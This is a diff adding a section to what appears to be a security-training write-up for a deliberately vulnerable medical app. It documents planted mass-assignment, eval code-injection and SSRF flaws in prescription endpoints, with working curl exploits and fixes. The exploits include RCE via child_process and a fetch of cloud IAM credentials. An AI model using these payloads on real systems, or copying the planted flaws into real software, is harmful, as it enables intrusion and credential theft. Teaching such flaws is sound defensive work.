@@ -238,6 +238,76 @@ add security headers (e.g. via `helmet`) incl. a strict CSP.
 
 ---
 
+## Prescriptions module (feature branch additions)
+
+The prescriptions & pharmacy-notification feature adds three **new** classes
+of vulnerability on top of the original ten.
+
+### #11 — Mass Assignment · `CWE-915` · OWASP A08
+
+**Where:** `server.js` → `POST /api/prescriptions`.
+
+The handler spreads the entire request body into the row **after** setting
+server defaults, so client-supplied fields win:
+
+```js
+const rx = { prescriber: req.user.name, status: 'active', ...req.body, … };
+```
+
+**Exploit:** set fields the UI never exposes — forge the prescriber, flip
+status, or seed a column a future workflow trusts:
+
+```bash
+curl -s --cookie "session=$TOKEN" http://localhost:3000/api/prescriptions \
+  -H 'Content-Type: application/json' \
+  -d '{"patient_id":1,"drug":"Oxycodone","prescriber":"Dr. Alice Reed","status":"approved"}'
+```
+
+The same concatenated INSERT is also a SQL-injection sink (class of #1).
+
+**Fix:** bind an explicit allow-list of columns; never spread untrusted
+input into a record. Use parameterized queries.
+
+### #12 — Server-Side Code Injection (`eval`) · `CWE-94` · OWASP A03
+
+**Where:** `server.js` → `POST /api/prescriptions/calc-dose`.
+
+```js
+const result = eval(formula); // formula is user input
+```
+
+**Exploit:** the "dosage formula" runs as server-side JavaScript → RCE:
+
+```bash
+curl -s --cookie "session=$TOKEN" http://localhost:3000/api/prescriptions/calc-dose \
+  -H 'Content-Type: application/json' \
+  -d '{"weight":70,"formula":"require(\"child_process\").execSync(\"id\").toString()"}'
+```
+
+**Fix:** never `eval` input. Use a safe arithmetic parser (e.g. a math
+expression library) or a fixed set of named formulas.
+
+### #13 — Server-Side Request Forgery · `CWE-918` · OWASP A10
+
+**Where:** `server.js` → `POST /api/prescriptions/notify-pharmacy`.
+
+The server makes an outbound request to a client-supplied URL and reflects
+the response back.
+
+**Exploit:** reach internal-only services / cloud metadata:
+
+```bash
+curl -s --cookie "session=$TOKEN" http://localhost:3000/api/prescriptions/notify-pharmacy \
+  -H 'Content-Type: application/json' \
+  -d '{"pharmacy_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+```
+
+**Fix:** allow-list destination hosts/schemes, resolve and block
+private/link-local IP ranges, disable redirects, and never return the raw
+upstream body.
+
+---
+
 ## Appointments module (feature branch additions)
 
 The scheduling & telehealth feature adds exactly **two** vulnerabilities. The
